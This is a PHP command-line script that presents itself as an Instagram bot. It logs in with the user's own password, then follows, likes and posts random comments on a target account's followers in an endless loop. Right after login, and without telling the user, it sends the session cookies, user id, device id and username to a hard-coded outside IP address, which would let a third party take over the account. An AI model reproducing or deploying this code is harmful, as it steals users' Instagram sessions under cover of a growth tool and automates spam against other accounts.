<?php
require('../func.php');
require('../ass.php');
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
echo $cyan;
echo banner();
sleep(1);
echo banner1();
echo banner2();
sleep(1);
echo $normal;
echo "" . $yellow . "[?]" . $normal . " Input your instagram username : ";
$userig = trim(fgets(STDIN, 1024));
echo "" . $yellow . "[?]" . $normal . " Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if ($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for ($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo "" . $green . "[+] Login Success...." . $normal . "\n";
    echo "" . $green . "[+] Please Wait" . $normal . "\n";
    sleep(1);
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig  = json_decode(req('http://198.204.232.138/~nthanfpm/other/bot/action/api().php', $data));
    //start
    echo "" . $yellow . "[?]" . $normal . " Input Target : ";
    $target = trim(fgets(STDIN, 1024));
    echo "" . $yellow . "[?]" . $normal . " Input Type \n1) Followers\n2) Following\nJust Input Number : ";
    $tipex  = trim(fgets(STDIN, 1024));
    echo "" . $yellow . "[?]" . $normal . " Input Total of Target You Want (ITTYW) : ";
    $jumlah = trim(fgets(STDIN, 1024));
    echo "" . $yellow . "[?]" . $normal . " Input Text Comment (Use [|] if more than 1) : ";
    $tex    = trim(fgets(STDIN, 10024));
    echo "" . $yellow . "[?]" . $normal . " Input Delay (in seconds) : ";
    $delay  = trim(fgets(STDIN, 1024));
    $iyh    = true;
    echo "\n";
    do {
        // start
        echo "" . $yellow . "[!] Please Wait...." . $normal . "\n";
        $idtarget = getuid($target);
        $getinfo  = proccess(1, $useragent, 'users/' . $idtarget . '/info/', $cookie);
        $getinfo  = json_decode($getinfo[1]);
        if($tipex == '1'):
            $tipenya = 'followers';
        else:
            $tipenya = 'following';
        endif;
        if ($tipenya == 'followers'):
            if (!is_numeric($jumlah))
                $limit = 1;
            elseif ($jumlah > ($getinfo->user->follower_count - 1))
                $limit = $getinfo->user->follower_count - 1;
            else
                $limit = $jumlah - 1;
            $tipe = 'followers';
        else:
            if (!is_numeric($jumlah))
                $limit = 1;
            elseif ($jumlah > ($getinfo->user->following_count - 1))
                $limit = $getinfo->user->following_count - 1;
            else
                $limit = $jumlah - 1;
            $tipe = 'following';
        endif;
        $c       = 0;
        $listids = array();
        do {
            $parameters = ($c > 0) ? '?max_id=' . $c : '';
            $req        = proccess(1, $useragent, 'friendships/' . $idtarget . '/' . $tipe . '/' . $parameters, $cookie);
            $req        = json_decode($req[1]);
            for ($i = 0; $i < count($req->users); $i++):
                if (count($listids) <= $limit)
                    $listids[count($listids)] = $req->users[$i]->pk;
            endfor;
            $c = (isset($req->next_max_id)) ? $req->next_max_id : 0;
        } while (count($listids) <= $limit);
        for ($i = 0; $i < count($listids); $i++):
        //user details
            $date = date("Y-m-d H:i:s");
            $getx = proccess(1, $useragent, 'users/' . $listids[$i] . '/info/', $cookie);
            $getx = json_decode($getx[1]);
            $priv = $getx->user->is_private;
            if ($priv == 1):
                echo "[x][".$date."][".$red."@".$req->users[$i]->username."".$normal."][".$red."User Private, Skiped...".$normal."]\n";
            else:
                $status       = proccess(1, $useragent, 'friendships/show/'.$req->users[$i]->pk.'/', $cookie);
                $statusx      = json_decode($status[1], true);
                if($statusx['following'] == true){
                    echo "[x][".$date."][".$red."@".$req->users[$i]->username."".$normal."][".$red."User Telah di Follow".$normal."]\n";
                } else {
                    //follow user
                    $follow = proccess(1, $useragent, 'friendships/create/' . $listids[$i] . '/', $cookie, hook('{"user_id":"' . $listids[$i] . '"}'));
                    $follow = json_decode($follow[1]);
                    if ($follow->status == 'ok'):
                        $follow_status = $green;
                    else:
                        $follow_status = $red;
                    endif;
                    //get new media user
                    $getmedia = proccess(1, $useragent, 'feed/user/' . $listids[$i] . '/', $cookie);
                    $getmedia = json_decode($getmedia[1], true);
                    $mediaId  = $getmedia['items'][0]['id'];
                    //like media
                    $like     = proccess(1, $useragent, 'media/' . $mediaId . '/like/', $cookie, hook('{"media_id":"' . $mediaId . '"}'), array(
                        'Accept-Language: id-ID, en-US',
                        'X-IG-Connection-Type: WIFI'
                    ));
                    $like     = json_decode($like[1]);
                    if ($like->status == 'ok'):
                        $like_status = $green;
                    else:
                        $like_status = $red;
                    endif;
                    //comment media
                    $text       = explode('|', $tex);
                    $rand       = array_rand($text);
                    $koment     = $text[$rand];
                    $comment    = proccess(1, $useragent, 'media/' . $mediaId . '/comment/', $cookie, hook('{"comment_text":"' . $koment . '"}'));
                    $comment    = json_decode($comment[1]);
                    if ($comment->status == 'ok'):
                        $comment_status = $green;
                    else:
                        $comment_status = $red;
                    endif;
                    echo "[+][".$date."][".$follow_status."@".$req->users[$i]->username."".$normal."][".$like_status."".$mediaId."".$normal."][".$comment_status."".$koment."".$normal."]\n";
                }
            endif;
        endfor;
        echo "" . $yellow . "[!]" . $normal . " Sleep For ".$delay." Seconds....\n\n";
        sleep($delay);
    } while($iyh == true);
}
?>